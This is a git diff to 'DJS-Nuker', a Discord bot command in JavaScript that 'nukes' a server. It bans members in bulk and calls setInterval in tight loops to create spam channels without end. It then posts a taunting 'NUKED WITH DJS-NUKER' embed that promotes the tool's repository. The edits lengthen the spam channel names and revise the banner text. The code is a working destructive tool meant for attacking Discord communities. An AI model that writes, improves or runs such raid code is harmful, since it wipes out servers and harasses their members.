@@ -13,8 +13,7 @@ module.exports.run = async(bot, message, args) => {
       
      if(ownerids.ownerid.includes(message.user.id)) return;
      
-     message.ban("Nuke")
-     console.log(members)
+     message.ban("Nuke").then(console.log)
 
      
    })
@@ -33,7 +32,7 @@ module.exports.run = async(bot, message, args) => {
 
     })
 
-    setInterval(function(){ message.guild.createChannel("¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲"), {
+    setInterval(function(){ message.guild.createChannel("¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲"), {
         type: "text",
         permissionOverwrites: [{
             id: message.guild.id,
@@ -41,7 +40,7 @@ module.exports.run = async(bot, message, args) => {
         }]
     } }, 0);
 
-    setInterval(function(){ message.guild.createChannel("oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯"), {
+    setInterval(function(){ message.guild.createChannel("oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯"), {
         type: "text",
         permissionOverwrites: [{
             id: message.guild.id,
@@ -49,7 +48,7 @@ module.exports.run = async(bot, message, args) => {
         }]
     } }, 1);
 
-    setInterval(function(){ message.guild.createChannel("№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳"), {
+    setInterval(function(){ message.guild.createChannel("№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳"), {
         type: "text",
         permissionOverwrites: [{
             id: message.guild.id,
@@ -79,14 +78,16 @@ module.exports.run = async(bot, message, args) => {
     
     const embed = new Discord.RichEmbed()
     .setColor("fd0000")
-    .setTitle("NUKED WITH DJS-Nuker")
+    .setTitle("NUKED WITH DJS-NUKER")
     .setImage("https://media0.giphy.com/media/HhTXt43pk1I1W/giphy.gif?cid=ecf05e474oc9z98k6l4zw3b3f4tm8kki7negnt30tm6geqrj&rid=giphy.gif")
-    .setFooter("Coded by setinal.")
+    .setFooter("Nuke Bot coded by setinal.")
     .addField("Do you also want to nuke?", "Check https://github.com/Setinal/DJS-Nuker")
 
     let fucked = message.guild.channels.find(channel => channel.name === "fucked-by-setinal")
     
     fucked.send(embed)
+
+    
 
 
 })
